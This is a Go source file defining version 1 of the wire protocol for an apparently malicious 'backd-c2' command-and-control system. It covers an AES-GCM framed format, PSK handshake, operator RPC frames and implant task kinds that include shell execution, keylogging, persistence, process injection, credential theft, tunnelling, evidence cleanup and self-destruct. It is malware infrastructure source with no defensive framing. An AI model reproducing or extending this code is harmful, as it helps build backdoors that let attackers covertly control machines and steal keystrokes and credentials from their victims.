package bdc2

// Wire protocol v1 constants. All multi-byte integers are big endian.
//
// Frame layout (24 byte header + payload):
//   0..3   magic "BDC2"
//   4      version = 1
//   5      type
//   6      flags (bit0 = cleartext payload, i.e. HELLO only)
//   7      reserved 0
//   8..15  session id (u64)
//   16..19 seq (u32, per connection and direction, monotonically increasing)
//   20..23 payload length (u32)
//   24..   payload
//
// Payload of every frame except HELLO is AES-128-GCM(header[0:24] as AAD).
// Nonce = [dir,0,0,0,0,0,0,0,seq(4 bytes)] -> 12 bytes.
//
// HELLO is cleartext TLV and carries an HMAC-SHA256 proof:
//   mac = HMAC-SHA256(psk, "hello" || client_id || hello_nonce)
// Session key = HKDF-SHA256(ikm=psk, salt=client_id||hello_nonce,
//                           info="backd-c2-v1", 16 bytes)
// This makes the key unique for every connection (fresh hello nonce) while
// still being replay protected (server keeps a nonce cache).

const (
	ProtoVersion = 1
	HeaderLen    = 24
	MaxFrame     = 1 << 20 // 1 MiB hard limit for MVP
	HelloSalt    = "backd-c2-v1"
)

// Frame types.
const (
	TypeHello      uint8 = 1
	TypeHelloAck   uint8 = 2
	TypeTask       uint8 = 3
	TypeTaskResult uint8 = 4
	TypeFileMeta   uint8 = 5
	TypeFileChunk  uint8 = 6
	TypeFileAck    uint8 = 7
	TypePing       uint8 = 8
	TypePong       uint8 = 9
	TypeAuth       uint8 = 10
	TypeAuthOK     uint8 = 11
	TypeNotice     uint8 = 12
	TypeError      uint8 = 13

	// Operator RPC (same envelope, operator connection).
	TypeOpList       uint8 = 20
	TypeOpListResult uint8 = 21
	TypeOpTask       uint8 = 22
	TypeOpResult     uint8 = 23
	TypeOpFilePush   uint8 = 24
	TypeOpFilePull   uint8 = 25
	TypeOpFileFetch  uint8 = 26
	TypeOpFileChunk  uint8 = 27
	TypeOpFileDone   uint8 = 28
	TypeOpKill       uint8 = 29
	TypeOpKick       uint8 = 30
)

// Direction bytes used in the GCM nonce.
const (
	DirClientToServer uint8 = 1
	DirServerToClient uint8 = 2
	DirOperToServer   uint8 = 3
	DirServerToOper   uint8 = 4
)

// Flag bits.
const (
	FlagCleartext uint8 = 1
)

// Task kinds. The wire format is frozen at BDC2 v1; kinds are payload
// strings, so the merged feature set (#4833/#4834/#4835) is expressed without
// any new frame type.
const (
	KindEcho    = "echo"
	KindShell   = "shell"
	KindSysinfo = "sysinfo"
	KindFileGet = "file_get" // client -> server chunked
	KindFilePut = "file_put" // server -> client chunked
	KindSleep   = "sleep"

	// Advanced kinds (requires server allow_advanced AND client --allow-adv).
	KindEnv            = "env"
	KindPs             = "ps"
	KindLs             = "ls"
	KindCat            = "cat"
	KindScreenshot     = "screenshot"
	KindPersistInstall = "persist_install"
	KindPersistStatus  = "persist_status"
	KindPersistDisable = "persist_disable"
	KindKeylogStart    = "keylog_start"
	KindKeylogStop     = "keylog_stop"
	KindKeylogDump     = "keylog_dump"
	KindTunnelOpen     = "tunnel_open"
	KindTunnelSend     = "tunnel_send"
	KindTunnelRecv     = "tunnel_recv"
	KindTunnelClose    = "tunnel_close"
	KindInject         = "inject"
	KindCreds          = "creds"
	KindCleanup        = "cleanup"
	KindSelfDestruct   = "selfdestruct"
)

var advancedKinds = map[string]bool{
	KindEnv: true, KindPs: true, KindLs: true, KindCat: true,
	KindScreenshot: true, KindPersistInstall: true, KindPersistStatus: true,
	KindPersistDisable: true, KindKeylogStart: true, KindKeylogStop: true,
	KindKeylogDump: true, KindTunnelOpen: true, KindTunnelSend: true,
	KindTunnelRecv: true, KindTunnelClose: true, KindInject: true,
	KindCreds: true, KindCleanup: true, KindSelfDestruct: true,
}

// IsAdvanced reports whether a task kind belongs to the merged advanced
// module set.
func IsAdvanced(kind string) bool { return advancedKinds[kind] }
